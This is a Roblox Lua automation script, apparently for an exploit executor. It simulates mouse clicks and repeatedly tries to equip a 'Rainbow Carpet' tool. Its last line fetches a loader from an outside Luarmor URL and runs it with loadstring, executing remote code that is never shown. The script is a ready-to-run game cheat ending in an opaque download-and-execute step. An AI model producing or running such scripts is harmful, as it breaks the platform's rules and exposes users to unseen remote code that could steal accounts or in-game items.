if not game:IsLoaded() then game.Loaded:Wait() end

local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer

repeat task.wait(0.1) until Workspace.CurrentCamera ~= nil

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")


-- ==========================================
-- HELPER FUNCTIONS
-- ==========================================
local function clickBottomRight()
    local camera = Workspace.CurrentCamera
    local x = camera.ViewportSize.X * 0.8
    local y = camera.ViewportSize.Y * 0.7
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
    task.wait(0.05)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
end

local function equipItem(itemName)
    character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local backpack = LocalPlayer:WaitForChild("Backpack")
    
    local item = character:FindFirstChild(itemName) or backpack:FindFirstChild(itemName)
    
    if item and item:IsA("Tool") then
        humanoid:EquipTool(item)
        return true
    end
    return false
end

-- ==========================================
-- MAIN AUTOMATION SEQUENCE
-- ==========================================

local hasCarpet = false
local attempts = 0
local maxAttempts = 10 

while attempts < maxAttempts do
    clickBottomRight()
    
    hasCarpet = equipItem("Rainbow Carpet")
    
    if hasCarpet then
        break -- Exit the loop, we are fully loaded!
    end
    
    attempts = attempts + 1
    task.wait(2) -- Wait 2 seconds before clicking/checking again
end

if hasCarpet then
    task.wait(2) -- Wait for the equip animation to finish
    clickBottomRight()
else
    -- warn("[-] Timing out: Carpet never loaded into inventory. Check item name.")
end

task.wait(5)

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/34faa0aa17d3660495c8b6f8bc204d6a.lua"))()
